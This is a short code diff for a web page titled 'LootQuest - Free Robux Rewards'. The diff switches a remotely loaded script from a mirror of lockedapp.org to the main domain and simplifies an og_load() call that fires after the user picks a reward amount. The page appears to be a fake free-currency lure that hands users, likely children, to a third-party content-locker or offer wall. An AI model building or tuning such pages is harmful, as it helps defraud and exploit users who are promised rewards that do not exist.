@@ -6,7 +6,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <title>LootQuest - Free Robux Rewards</title>
-  <script type="text/javascript" id="ogjs" src="https://mirror.lockedapp.org/cl/js/m55o98"></script>
+  <script type="text/javascript" id="ogjs" src="https://lockedapp.org/cl/js/m55o98"></script>
 </head>
 <body>
 
@@ -159,15 +159,14 @@ function selectReward(amount) {
   setTimeout(() => {
     step4Div.style.display = 'block';
     
-    const container = document.getElementById('ogads-container');
-    console.log('Step 4 visible, container:', container);
+    console.log('Step 4 visible');
     console.log('og_load available:', typeof og_load);
     
     if (typeof og_load === 'function') {
-      console.log('Executing og_load...');
+      console.log('Executing og_load()...');
       try {
-        og_load({ container: 'ogads-container' });
-        console.log('og_load executed successfully');
+        og_load();
+        console.log('og_load() executed successfully');
       } catch (error) {
         console.error('Error executing og_load:', error);
       }
